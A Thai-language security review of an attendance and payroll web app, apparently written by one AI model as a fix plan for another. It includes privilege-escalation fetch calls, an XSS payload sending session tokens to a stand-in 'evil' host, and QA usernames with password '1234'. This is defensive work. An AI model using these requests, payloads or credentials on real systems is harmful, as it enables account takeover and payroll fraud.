# Security & Code Review — Time Attendance Web App
**วันที่ review:** 2026-07-19 · **Reviewer:** Opus 4.8 · **ผู้เขียนโค้ดแก้ไข:** Sonnet 5 (session ถัดไป)

> เอกสารนี้คือ **แผนงานสำหรับ Sonnet 5** ใช้เป็น checklist เขียนโค้ดแก้ไขทีละข้อ
> ทุกข้ออ้างอิงไฟล์+บรรทัดจริง (ณ วันที่ review) — ก่อนแก้ให้ verify บรรทัดอีกครั้งเพราะเลขอาจขยับ
> ไฟล์หลัก: `Z:\attendance-server\backend\server.js` (1497 บรรทัด) · `Z:\attendance\js\app.js` (~11,500 บรรทัด)

---

## 🔴 บทสรุปผู้บริหาร (อ่านก่อน)

แอปนี้มี **ช่องโหว่ระดับวิกฤต 3 ข้อที่ต่อกันเป็นลูกโซ่** ทำให้พนักงานทั่วไป (role `user`) คนเดียว
สามารถ **ยึดสิทธิ์เป็น Managing Director, อ่านเงินเดือน/เลขบัญชี/เลขบัตรประชาชนของทุกคน,
และอนุมัติ OT/เบี้ยเลี้ยงให้ตัวเอง (ทุจริต payroll)** ได้ภายในไม่กี่คำสั่งผ่าน browser devtools

**สาเหตุแกนกลาง:** ระบบตรวจสิทธิ์ (authorization) **อยู่ที่ frontend เท่านั้น** — backend เชื่อว่า
"ใครมี token ที่ valid = ทำอะไรก็ได้" ไม่มีการเช็ค role ที่ฝั่ง server แม้แต่ endpoint เดียว

**ลำดับความสำคัญในการแก้:** Phase 1 (วิกฤต, ต้องแก้ก่อน rollout จริง) → Phase 2 (สูง) → Phase 3 (กลาง/ปรับปรุง)

---

## PHASE 1 — วิกฤต (ต้องแก้ก่อนให้พนักงานใช้จริง)

### 🔴 F-01 — Broken Access Control: ไม่มีการเช็ค role ที่ backend เลย
**ระดับ:** วิกฤต (privilege escalation + payroll fraud + data breach)
**ที่:** `server.js` — global JWT middleware บรรทัด 265–287 เช็คแค่ token valid + observer read-only
ทุก endpoint ที่แก้ข้อมูลไม่เช็ค `req.user.role` เลย (ยืนยันแล้ว: `grep req.user.role` = 0 ผลลัพธ์)

**Exploit จริง (พนักงาน role `user` เปิด devtools console):**
```js
// เลื่อนตัวเองเป็น MD — employeeNo ของตัวเองคือ '9'
fetch(NAS_BACKEND+'/api/users/9/role', {method:'PUT',
  headers:{Authorization:'Bearer '+localStorage.ta_token,'Content-Type':'application/json'},
  body:JSON.stringify({role:'md'})})
// หรือ: reset รหัส MD แล้ว login เป็น MD
fetch(NAS_BACKEND+'/api/users/10/password', {method:'PUT', headers:{...},
  body:JSON.stringify({password:'hacked1234'})})
// หรือ: อนุมัติ OT ตัวเองให้ payroll จ่ายเงิน
fetch(NAS_BACKEND+'/api/leaves/123', {method:'PUT', headers:{...},
  body:JSON.stringify({status:'approved'})})
```

**Endpoint ที่ต้องเพิ่ม role guard (ทั้งหมด):**

| Endpoint | Method | ใครควรทำได้ (whitelist) |
|---|---|---|
| `/api/users` | POST | md, accounting, manager |
| `/api/users/:empNo/role` | PUT | **md เท่านั้น** |
| `/api/users/:empNo/password` | PUT | md, accounting |
| `/api/users/:empNo` | PUT | md, accounting, manager |
| `/api/users/sync-hikvision` | POST | md, accounting, manager |
| `/api/sync-name` | POST | md, accounting, manager |
| `/api/settings` | PUT | md, accounting |
| `/api/holidays` | POST/DELETE | md, accounting |
| `/api/finalize` | PUT | accounting, md |
| `/api/attachments/clear` | POST | md |
| `/api/attachments/info` | POST | md, accounting |
| `/api/send-payslip` | POST | accounting, md |
| `/api/test-email` | POST | md, accounting |
| `/api/test-pending-notification` | POST | md, accounting |
| `/api/leaves` | POST | ทุก role **แต่** ต้องบังคับ `userId = req.user.sub` (ห้าม submit แทนคนอื่น) และบังคับ `status` เริ่มต้น (ดู F-02) |
| `/api/leaves/:id` | PUT | ดู F-02 (ต้องเช็คตาม approval routing ไม่ใช่แค่ role) |
| `/api/leaves/:id` | DELETE | เจ้าของคำขอ (ตอน pending) หรือ md |

**วิธีทำสำหรับ Sonnet 5:**
1. สร้าง helper middleware factory ใกล้ๆ กับ JWT middleware เดิม:
```js
// วางหลัง global JWT middleware (หลังบรรทัด ~287)
function requireRole(...roles) {
  return (req, res, next) => {
    if (!req.user || !roles.includes(req.user.role)) {
      return res.status(403).json({ success:false, message:'Forbidden: insufficient role' });
    }
    next();
  };
}
```
2. **สำคัญ:** `req.user.role` มาจาก JWT payload ที่ sign ตอน login (บรรทัด 488) — role นี้ **freeze ตั้งแต่ login** ถ้า MD เปลี่ยน role ใครระหว่างนั้น token เก่ายังถือ role เดิม → **แนะนำ re-fetch role สดจาก users.json ใน `requireRole`** (เหมือน observer check ที่ทำอยู่แล้วบรรทัด 277–281) เพื่อไม่ให้คนที่เพิ่งถูกลดสิทธิ์ยังใช้ token เดิมทำ admin action ได้:
```js
function requireRole(...roles) {
  return (req, res, next) => {
    const users = readUsers() || [];
    const live = users.find(u => u.id === req.user.sub);
    const role = live ? live.role : req.user.role;
    if (!roles.includes(role)) return res.status(403).json({ success:false, message:'Forbidden' });
    next();
  };
}
```
3. ใส่ middleware ในทุก route ตามตาราง เช่น `app.put('/api/users/:empNo/role', requireRole('md'), (req,res)=>{...})`
4. **อย่าลืม:** endpoint ที่ frontend เรียกอยู่แล้วต้องยังทำงานได้กับ role ที่ถูกต้อง — ทดสอบทุก role ผ่าน QA accounts (ดู memory `project_time_attendance_qa_accounts`) ว่า role ที่ควรทำได้ยังทำได้ และ role ที่ไม่ควร ได้ 403

**Verify:** login เป็น `teerawat` (user) → เรียก `PUT /api/users/9/role {role:'md'}` ต้องได้ **403**;
login เป็น `takiuchi` (md) → เรียกอันเดียวกัน ต้องได้ 200

---

### 🔴 F-02 — Client ควบคุม status/userId/จำนวนเงินของ leave ได้เอง (approval bypass + payroll injection)
**ระดับ:** วิกฤต · **ที่:** `server.js` `POST /api/leaves` (795–810) และ `PUT /api/leaves/:id` (812–828)

**ปัญหา:**
- `POST` ทำ `{ ...body, id }` — client ส่ง `status:'approved'`, `userId` ของคนอื่น, หรือ field จำนวนเงิน (`otHours`, `personalCarRate`, `distanceKm`) มาเองได้ → สร้างคำขอที่ "อนุมัติแล้ว" ให้ตัวเอง/คนอื่น → เข้า payroll ตรงๆ
- `PUT` ทำ `{ ...leaves[idx], ...updates }` — client เขียนทับ **ทุก field** รวมถึง `status`, `approvedBy`, จำนวนเงิน, `userId`

**วิธีทำสำหรับ Sonnet 5:**
1. **`POST /api/leaves`** — server ต้องบังคับค่าต่อไปนี้เอง ห้ามรับจาก client:
   - `userId = req.user.sub` เสมอ (ยกเว้น role md/accounting/manager ที่อาจ submit แทนได้ตาม business rule — ถ้ามี ให้ whitelist ชัดเจน)
   - `status` = สถานะเริ่มต้นตาม approval routing ของ type นั้น (ไม่ใช่ค่าที่ client ส่ง) — ดู logic ใน frontend ว่า type ไหนเริ่มที่ `pending`/`pending-md`/`pending-accounting`
   - `approvedBy`, `approvedAt`, `serverCreatedAt` = server กำหนด
   - Whitelist field ที่ client แก้ได้ (type, dateFrom, dateTo, reason, hours ฯลฯ) — อย่าใช้ `{...body}` แบบเหมารวม
2. **`PUT /api/leaves/:id`** — แยกเป็น 2 เส้นทางตาม intent:
   - **เจ้าของแก้คำขอตัวเอง (ตอน pending):** อนุญาตเฉพาะ field เนื้อหา (reason, date, hours) และเฉพาะเมื่อ `leaves[idx].userId === req.user.sub` และ status ยัง pending
   - **การอนุมัติ (เปลี่ยน status):** ต้องเช็คว่า `req.user.role` (สดจาก users.json) เป็น role ที่มีสิทธิ์อนุมัติ stage ปัจจุบันจริง ตาม `settings.json` → `approvalRouting[type]` — ไม่ใช่ให้ใครก็ได้เปลี่ยน status
   - เขียน field ที่อนุญาตแบบ whitelist ต่อ intent เท่านั้น
3. ตรวจสอบว่า transition ของ status ถูกต้อง (state machine): เช่น `pending → pending-md → approved` — ไม่ให้ client กระโดดข้าม stage

**Verify:** login `teerawat` → `POST /api/leaves {userId:2, status:'approved', type:'ot', otHours:8}` →
server ต้อง (ก) เขียน `userId` เป็น 7 (ของ teerawat เอง) ไม่ใช่ 2, (ข) เขียน status เป็น pending stage แรก ไม่ใช่ approved

---

### 🔴 F-03 — Stored XSS: ข้อมูล user-controlled ยิงเข้า innerHTML โดยไม่ escape
**ระดับ:** วิกฤต (ต่อลูกโซ่กับ token ใน localStorage = ยึด session ของ MD)
**ที่:** `app.js` — ไม่มี `escapeHtml` helper เลยทั้งไฟล์ · จุดที่ inject ดิบ เช่น
บรรทัด 4273, 4368, 5888, 5890, 5895, 6091, 6644, 6723 (`${l.reason}`), 4400/4609/5056/5293 (`${u.name}`), 4613 (`${u.position}`)

**Exploit:** พนักงานส่งคำขอที่ `reason` = `<img src=x onerror="fetch('https://evil/c?t='+localStorage.ta_token)">`
→ เมื่อ MD เปิดหน้าอนุมัติ/report detail → script รันใน session ของ MD → ขโมย token MD → ผู้โจมตีเป็น MD
(หมายเหตุ: ชื่อบางส่วนมาจาก Hikvision sync = semi-trusted แต่ reason/หมายเหตุ = พนักงานพิมพ์เองล้วนๆ)

**วิธีทำสำหรับ Sonnet 5:**
1. เพิ่ม helper ที่ต้นไฟล์ (ใกล้ๆ `function L(...)`):
```js
function escapeHtml(s) {
  return String(s == null ? '' : s)
    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
    .replace(/"/g,'&quot;').replace(/'/g,'&#39;');
}
```
2. **หาทุกจุดที่ interpolate ข้อมูลจาก DATA (ไม่ใช่ค่าคงที่ในโค้ด) เข้า template literal ที่จะไปเป็น `innerHTML`** แล้วห่อด้วย `escapeHtml()`:
   - Field ที่ต้อง escape เสมอ: `reason`, `name`, `position`, `username`, `dept`, `bankName`, `bankAccount`, `idCard`, `phone`, `address`, `email`, `emergencyContact`, `holderName`, ชื่อลูกค้า/สถานที่ upcountry, และ field ข้อความอิสระอื่นๆ
   - ตัวเลข/วันที่/enum ที่ server/โค้ดควบคุม ไม่จำเป็นต้อง escape แต่ escape ไว้ก็ไม่เสียหาย
3. วิธีหาให้ครบ: `grep -nE '\$\{[^}]*\.(reason|name|position|username|dept|bankAccount|idCard|phone|address|email|holderName)' app.js` แล้วไล่ทีละจุด ดูว่าจุดนั้นไปเป็น `innerHTML` หรือ `textContent` — **เฉพาะที่เป็น innerHTML ถึงต้อง escape** (textContent ปลอดภัยอยู่แล้ว)
4. ระวัง: บาง field ใช้ทั้งใน `innerHTML` และใน attribute เช่น `value="${u.name}"` — ต้อง escape เหมือนกัน (เพราะ `"` ปิด attribute แล้วแทรก `onload=` ได้)

**Verify:** สร้างคำขอทดสอบ (QA account) ที่ reason มี `<img src=x onerror=alert(1)>` → เปิดหน้าอนุมัติด้วย QA md →
ต้อง **ไม่มี alert เด้ง** และเห็นข้อความ literal `<img src=x ...>` แทน

---

### 🔴 F-04 — `/api/upload` เปิดสาธารณะ (ไม่ต้อง login) + serve ไฟล์ที่อัปโหลดกลับบน origin เดียวกัน
**ระดับ:** วิกฤต/สูง · **ที่:** `server.js` — `PUBLIC_PATHS` บรรทัด 264 มี `/api/upload`; upload route 902–911; download 913–925

**ปัญหา:**
- ใครก็ได้ (ไม่ต้อง login, แอปอยู่บน public domain ผ่าน Cloudflare) POST ไฟล์อะไรก็ได้ → เก็บลง disk → ได้ URL กลับ
  → **open file hosting** (storage exhaustion, โฮสต์มัลแวร์ด้วย domain บริษัท)
- ไฟล์ถูก serve กลับผ่าน `res.sendFile` **บน origin เดียวกับแอป** โดยไม่กำหนด Content-Type/Content-Disposition
  → อัปโหลด `.html` ที่มี `<script>` แล้วเปิด link → **รัน JS บน origin `attendance.tozaiboeki.co.th`** → ขโมย token ใน localStorage ของใครก็ตามที่เปิด (stored XSS แบบ same-origin)

**วิธีทำสำหรับ Sonnet 5:**
1. **เอา `/api/upload` ออกจาก `PUBLIC_PATHS`** → บังคับต้องมี token (พนักงานที่ login แล้วเท่านั้นอัปโหลดได้)
2. Download route `/api/upload/:filename` — ต้องมี token ด้วย (ตอนนี้ก็อยู่ใน public เพราะ prefix match `/api/upload`) → หลังเอาออกจาก PUBLIC_PATHS จะโดน JWT middleware อัตโนมัติ ✔
3. ตอน serve ไฟล์ ให้ **บังคับ download แทนการ render inline** เพื่อกัน HTML/SVG รันบน origin:
```js
res.setHeader('Content-Disposition', 'attachment; filename="'+safeName+'"');
res.setHeader('X-Content-Type-Options', 'nosniff');
res.sendFile(fp);
```
4. จำกัดชนิดไฟล์ตอน upload (whitelist นามสกุล: pdf, jpg, png, docx, xlsx ตามที่ FAQ บอกว่ารองรับ) และตรวจขนาด
5. พิจารณา: ผูก upload กับ user (เก็บ `uploaderId`) เผื่อ audit

**Verify:** เปิด incognito (ไม่ login) → `POST /api/upload` → ต้องได้ 401; เปิดไฟล์ที่อัปโหลด → header มี `Content-Disposition: attachment`

---

### 🔴 F-05 — `GET /api/settings` คืน SMTP password / Resend API key ให้ทุก user ที่ login
**ระดับ:** วิกฤต/สูง · **ที่:** `server.js` 772–775 (`res.json(settings)` คืนทั้ง object รวม `emailConfig.pass`)

**ปัญหา:** พนักงานทั่วไป `fetch('/api/settings')` แล้วอ่าน `emailConfig.pass` (Resend API key `re_...`) ได้ →
นำไปส่งอีเมลในนามบริษัทได้เต็มที่ (นอกระบบด้วยซ้ำ) + `/api/send-payslip`, `/api/test-email` รับ `to` อิสระ = ใช้เป็น relay

**วิธีทำสำหรับ Sonnet 5:**
1. `GET /api/settings` — **strip secret ออกก่อนส่ง** ให้ role ที่ไม่ใช่ md/accounting:
```js
app.get('/api/settings', (req, res) => {
  const s = readJSON('settings.json', {});
  const live = (readUsers()||[]).find(u=>u.id===req.user.sub);
  const isAdmin = live && ['md','accounting'].includes(live.role);
  if (!isAdmin && s.emailConfig) {
    s.emailConfig = { ...s.emailConfig, pass: undefined, smtpUser: undefined };
  }
  res.json(s);
});
```
   - หมายเหตุ: frontend ที่ไม่ใช่ admin ไม่ได้ใช้ `emailConfig.pass` อยู่แล้ว (หน้า Settings SMTP โชว์เฉพาะ md/accounting) — การ strip จึงไม่กระทบการทำงาน
2. `POST /api/send-payslip`, `/api/test-email`, `/api/test-pending-notification` — เพิ่ม `requireRole('md','accounting')` (อยู่ใน F-01 อยู่แล้ว) เพื่อปิด relay
3. พิจารณาย้าย `emailConfig.pass` ไปเก็บแยกไฟล์ที่ frontend ไม่มีทางดึง (เช่น env var หรือไฟล์ที่ไม่ผ่าน /api/settings เลย)

**Verify:** login `teerawat` (user) → `GET /api/settings` → `emailConfig.pass` ต้องเป็น `undefined`/หายไป;
login `sirintorn` (accounting) → เห็นค่าได้

---

## PHASE 2 — สูง

### 🟠 F-06 — Excessive Data Exposure: ทุก role อ่านข้อมูลทุกคนได้
**ที่:** `GET /api/users` (431–434 คืนทุกคนรวม salary/idCard/bankAccount/phone/address),
`GET /api/leaves` (791), `GET /api/finalize` (975), `GET /api/events` (708)

**ปัญหา:** พนักงานทั่วไปดึง `/api/users` เห็นเงินเดือน/เลขบัญชี/เลขบัตร ปชช./ที่อยู่/เบอร์ ของเพื่อนร่วมงานทุกคน (PDPA/ความลับ)

**วิธีทำ:**
1. `GET /api/users` — แยก response ตาม role:
   - md/accounting/manager: เห็น field ที่จำเป็นตามงาน (manager อาจไม่ต้องเห็น salary/bank ของคนอื่น — ยืนยัน business rule กับผู้ใช้)
   - user/driver/marketing: เห็นเฉพาะ field ที่ไม่ sensitive (name, position, dept, employeeNo, facePhoto) ที่จำเป็นต่อการแสดง UI + record ของตัวเองแบบเต็ม
   - สร้าง whitelist ต่อ role ชัดเจน (อย่าคืน password อยู่แล้ว ✔ แต่ salary/idCard/bankAccount/phone/address/email ต้องกรอง)
2. `GET /api/leaves`, `/api/finalize`, `/api/events` — ถ้า role เป็น user/driver/marketing ให้ filter เฉพาะ `userId === req.user.sub`; admin roles เห็นทั้งหมด
3. **หมายเหตุสำคัญ:** ต้องเช็ค frontend ว่าหน้าไหนพึ่งข้อมูลรวม (dashboard headcount, ปฏิทินวันลารวม) — ถ้า role ปกติเคยเห็น "ใครลาวันนี้บ้าง" อาจต้องมี endpoint สรุปที่ปลอดภัย (คืนแค่ชื่อ+ประเภท ไม่มีเงิน) แยกจากการดึง raw ทั้งก้อน

**Verify:** login `teerawat` → `GET /api/users` → record ของคนอื่นต้องไม่มี `salary`/`bankAccount`/`idCard`

---

### 🟠 F-07 — ความลับ hardcode ในซอร์ส
**ที่:** `server.js` 335 `HIK = {user:'admin', pass:'<redacted>'}`; DEFAULT_USERS ทุกคน `password:'1234'` (226–234);
deploy scripts มี NAS password `<redacted>` (ดู `scripts/deploy/*.py`)

**วิธีทำ:**
1. ย้าย Hikvision creds ไป env var หรือไฟล์ config ที่ไม่ commit (`data/hik-config.json` + gitignore) — อ่านเหมือน jwt-secret
2. NAS password ใน deploy script → env var (`NAS_PASS`) หรือ `~/.ta-deploy.env` ที่ไม่อยู่ในซอร์ส
3. DEFAULT_USERS `password:'1234'` — ใช้เฉพาะตอน seed ครั้งแรก แต่ควร (ก) บังคับเปลี่ยนรหัสตอน login ครั้งแรก หรือ (ข) generate รหัสสุ่มตอน seed แล้วแจ้ง admin — ดู F-09
4. **สำคัญ:** ซอร์สอยู่บน NAS ที่หลายคนเข้าถึง (Z: drive) → secret ในซอร์ส = ใครอ่าน Z: ได้ก็เห็น

---

### 🟠 F-08 — ไม่มีการเพิกถอน token / token อายุ 30 วัน / logout ฝั่ง client อย่างเดียว
**ที่:** JWT sign บรรทัด 488 (`expiresIn 30d` เมื่อ remember); logout = `clearSession()` ฝั่ง frontend เท่านั้น;
password reset (563–574) ไม่ invalidate token เก่า

**ปัญหา:** token หลุด (เช่นจาก XSS ก่อนแก้ F-03/F-04) = ใช้ได้ยาว 30 วัน, reset รหัสไม่เตะ session เดิมออก,
คนที่ถูกไล่ออก/ลดสิทธิ์ token เดิมยังใช้ได้จนหมดอายุ

**วิธีทำ (เลือกตามความพร้อม):**
1. **ขั้นต่ำ:** เพิ่ม `tokenVersion` (integer) ในแต่ละ user record → ใส่ใน JWT payload ตอน sign →
   JWT middleware เช็คว่า `payload.tokenVersion === live.tokenVersion` ไม่งั้น 401 →
   เวลา reset รหัส/ลดสิทธิ์/logout-all ก็ `tokenVersion++` = เตะทุก session เก่าออกทันที
2. ลด `expiresIn` remember จาก 30d เหลือ 7d (สมดุล UX/ความปลอดภัย) — ยืนยันกับผู้ใช้
3. password reset endpoint → `tokenVersion++` ของ user นั้นด้วย

---

### 🟠 F-09 — รหัสผ่านเริ่มต้นอ่อน (`1234`) + min length 4
**ที่:** DEFAULT_USERS + sync-hikvision (`password:'1234'` บรรทัด 637) + password endpoint min 4 (565)

**วิธีทำ:**
1. บังคับเปลี่ยนรหัสตอน login ครั้งแรก (เพิ่ม flag `mustChangePassword` → frontend บังคับหน้าเปลี่ยนรหัสก่อนใช้งาน)
2. เพิ่ม min length เป็น 8 และ policy พื้นฐาน (มีตัวเลข+ตัวอักษร)
3. sync-hikvision: generate รหัสสุ่มต่อคน แทน `1234` เดียวกันหมด แล้วให้ admin แจกผ่านช่องทางปลอดภัย

---

## PHASE 3 — กลาง / ปรับปรุงคุณภาพ

### 🟡 F-10 — CORS wildcard `*`
**ที่:** 253–255. auth เป็น Bearer token (ไม่ใช่ cookie) → CSRF เสี่ยงต่ำ แต่ `*` กว้างเกิน
**วิธีทำ:** จำกัด `Access-Control-Allow-Origin` เป็น domain จริง (`https://attendance.tozaiboeki.co.th`) — ยืนยันว่าไม่มี client ข้าม origin ที่ถูกต้อง

### 🟡 F-11 — Hikvision IP allowlist ใช้ `req.socket.remoteAddress` ขณะ `trust proxy` เปิด
**ที่:** 378–380. Endpoint นี้ device ยิงตรงบน LAN (ไม่ผ่าน CF) → remoteAddress = IP จริง = ปลอดภัยจาก header spoof ✔
แต่ควร comment ให้ชัดว่าทำไมใช้ socket ไม่ใช่ `req.ip` (เพราะ req.ip จะเชื่อ X-Forwarded-For จาก trust proxy) — กันคนแก้ผิดภายหลัง

### 🟡 F-12 — `PUT /api/finalize` เขียนทับทั้งไฟล์จาก client
**ที่:** 980–990. client ส่ง object payroll ทั้งก้อนมาเขียนทับ → เสี่ยง race (2 คนเซฟพร้อมกัน ทับกัน) + ไม่ validate โครงสร้าง
**วิธีทำ:** พิจารณา endpoint แบบ patch ต่อ record (ต่อ user/period) แทนทั้งก้อน + validate ค่าตัวเลข + role guard (F-01)

### 🟡 F-13 — ID assignment แบบ `Math.max(...ids)+1` (race condition)
**ที่:** `POST /api/users` (529), `POST /api/leaves` (800), holidays (728)
2 request พร้อมกัน → id ชนกัน (data corruption). **วิธีทำ:** ใช้ counter ที่ persist + lock, หรือ UUID, หรือ timestamp-based id

### 🟡 F-14 — `readUsers()` fallback ไม่สม่ำเสมอ (`|| DEFAULT_USERS` vs `|| []`)
**ที่:** login ใช้ `|| DEFAULT_USERS` (467) — ถ้า users.json อ่านไม่ได้ชั่วคราว จะ fallback ไป DEFAULT (รหัส `1234`) →
เสี่ยง login ด้วยรหัส default. **วิธีทำ:** ถ้าอ่าน users.json ไม่ได้ ควร fail-closed (500) ไม่ fallback ไป default ที่ login endpoint

### 🟡 F-15 — `getEmailTransport` hardcode `secure:false`
**ที่:** 1002. port 465 (implicit TLS) ใช้ไม่ได้ ต้อง 587 เท่านั้น. **วิธีทำ:** `secure: Number(cfg.port) === 465` ให้เลือกอัตโนมัติตาม port

### 🟡 F-16 — Email HTML รับ payslip object จาก client แล้ว render ตรง (F-05 เกี่ยว)
**ที่:** `send-payslip` (1046) render `payslip` ที่ client ส่งมาลง HTML. หลังจำกัด role (F-01) ความเสี่ยงลด
แต่ควร: server สร้าง payslip เองจากข้อมูลจริง (userId + period) ไม่รับ HTML/ตัวเลขจาก client → กันปลอมสลิป

### 🟡 F-17 — Email template ฝั่ง server ก็ interpolate user-data ลง HTML โดยไม่ escape (เพิ่มจากรอบอ่าน backend ให้ครบ 2026-07-19)
**ระดับ:** กลาง (email client ส่วนใหญ่ sanitize/strip script อยู่แล้ว → severity ต่ำกว่า F-03 ที่เป็น browser DOM)
**ที่:** `server.js` — `sendResultEmail`/`buildResultDetailRows` (126–199): `${value}` (บรรทัด 172) รับ `leave.reason`,
`leave.lateOutTime`, mileage ฯลฯ ลง HTML ตรงๆ; `buildPendingEmailHtml`/`personCard` ใช้ `${g.empName}` (ชื่อจาก user record)
**ปัญหา:** field ที่ผู้ใช้พิมพ์เอง (reason) หลุดเข้า HTML ของอีเมล — แม้ email client ส่วนใหญ่จะกัน `<script>`/`onerror`
แต่เป็น defense-in-depth ที่ควรปิด (บาง client/preview อาจ render markup แปลกๆ, และเป็น class เดียวกับ F-03)
**วิธีทำ:** ทำ `escapeHtml()` เวอร์ชัน server-side (เหมือน F-03) แล้วห่อทุก user-data ที่ลง email HTML —
`value` ใน detailRows, `g.empName`, `l.reason` ทุกจุดใน email builder. **แนะนำทำคู่กับ F-03** (helper เดียวกันคนละไฟล์)

### 🟡 F-18 — JSON file writes ไม่มี lock/atomicity — concurrent write ทำข้อมูลหาย/พัง (เพิ่มจากรอบอ่าน backend ให้ครบ)
**ระดับ:** กลาง (durability/data-integrity ไม่ใช่ security โดยตรง แต่กระทบเงิน/ข้อมูลจริง)
**ที่:** `saveEvent` (206–213), `saveLeaves` (219), `saveUsers` (241), `writeJSON` (767), finalize (983) —
ทุกตัวเป็น read-modify-write ทั้งไฟล์ผ่าน `fs.writeFileSync` ไม่มี lock
**ปัญหา:** 2 request แก้ไฟล์เดียวกันพร้อมกัน (เช่น 2 คนอนุมัติ/เซฟ setting/finalize พร้อมกัน) → last-write-wins ทับกัน
หรือถ้าเขียนขาดกลางคัน → ไฟล์ JSON พัง (readXxx จะ throw แล้ว fallback เป็น `[]`/`null` = ข้อมูลหายทั้งไฟล์).
`saveEvent` ยังใช้ `events[events.length-1].id + 1` (id ตัวสุดท้าย+1) เป็น id ใหม่ — ถ้า record สุดท้ายถูกลบ/ไม่เรียงตาม id จะชนกัน (F-13 variant)
**วิธีทำ (เลือกตามความพร้อม):**
1. **ขั้นต่ำ:** เขียนแบบ atomic — เขียนลงไฟล์ temp แล้ว `fs.renameSync` (atomic บน filesystem เดียวกัน) กันไฟล์พังกลางคัน
2. เพิ่ม in-process write queue/mutex ต่อไฟล์ (serialize การเขียนไฟล์เดียวกัน) กัน lost-update
3. ระยะยาว: พิจารณาย้ายจาก JSON flat file ไป SQLite (มี transaction/locking จริง) — เป็นงานใหญ่ ไว้เฟสหลัง
4. id assignment: ใช้ `Math.max(...ids)+1` แทน last-element (ยังไม่ atomic แต่ทนกว่า) — รวมกับ F-13

---

## ✅ สถานะความครอบคลุมของ review (อัปเดต 2026-07-19)
- **Backend `server.js` (1497 บรรทัด): อ่านครบ 100% แล้ว** — F-01..F-18 ครอบคลุม security + robustness ของ backend ทั้งหมด
- **Frontend `app.js` (~11,500 บรรทัด): ตรวจเฉพาะผิว security (XSS surface + token handling) ผ่าน targeted grep** —
  ยัง**ไม่ได้**ไล่ logic bug ทีละบรรทัด (payroll/ภาษี/SSO/OT calc, date/period/carry-forward, approval state machine ฝั่ง frontend)
  → ถ้าต้องการความมั่นใจเรื่อง "คิดเงินถูกไหม/edge case" ต้อง review frontend logic เพิ่มเป็นรอบแยก (ยังไม่ได้ทำ)

---

## ลำดับการทำงานที่แนะนำสำหรับ Sonnet 5

**Sprint 1 (บล็อกการ rollout — ต้องเสร็จก่อนใช้จริง):** F-01 → F-02 → F-03 → F-04 → F-05
> ทำ backend (F-01,02,04,05) เป็นชุดเดียว deploy+restart ครั้งเดียว, ทำ frontend XSS (F-03) แยก
> **ทดสอบทุก role ผ่าน QA accounts ให้ครบ** ว่า role ที่ควรทำได้ยังทำได้ (ไม่พังของเดิม) และ role ที่ไม่ควร ได้ 403

**Sprint 2 (สูง):** F-06 → F-07 → F-08 → F-09

**Sprint 3 (ปรับปรุง):** F-10 ถึง F-16

## หลักการทดสอบ (สำคัญมาก — ทำทุก fix)
1. **Regression ต่อ role:** ใช้ QA accounts ทั้ง 5 role (`takiuchi`/md, `sirintorn`/accounting, `loesan`/manager, `teerawat`/user, `jaraspong`/driver — รหัส `1234`) ผ่าน Playwright ยืนยันว่างานเดิมของแต่ละ role ยังทำได้
2. **Negative test:** ยืนยันว่า role ที่ไม่มีสิทธิ์ได้ 403 จริง (ไม่ใช่แค่ปุ่มหายที่ UI — ต้องยิง API ตรงด้วย)
3. **ห้าม deploy ทับ backend โดยไม่ทดสอบ** — restart backend ล้าง rate-limit + ต้องเช็ค log ว่าไม่มี error ตอน start (ดู memory: จด line count ก่อน restart แล้ว `tail -n +N`)
4. อัปเดต memory `project_time_attendance.md` ทุก fix ที่ทำเสร็จ

## จุดที่ทำได้ดีอยู่แล้ว (ไม่ต้องแก้)
- bcrypt hash + auto-migrate จาก plaintext ✔
- JWT secret persist (ไม่ regenerate) ✔
- Observer read-only enforcement ที่ server ✔
- Path traversal guard ที่ upload download (`path.basename`) ✔
- Rate limit login แบบ per-username ✔
- Hikvision IP allowlist ใช้ socket address (กัน header spoof) ✔
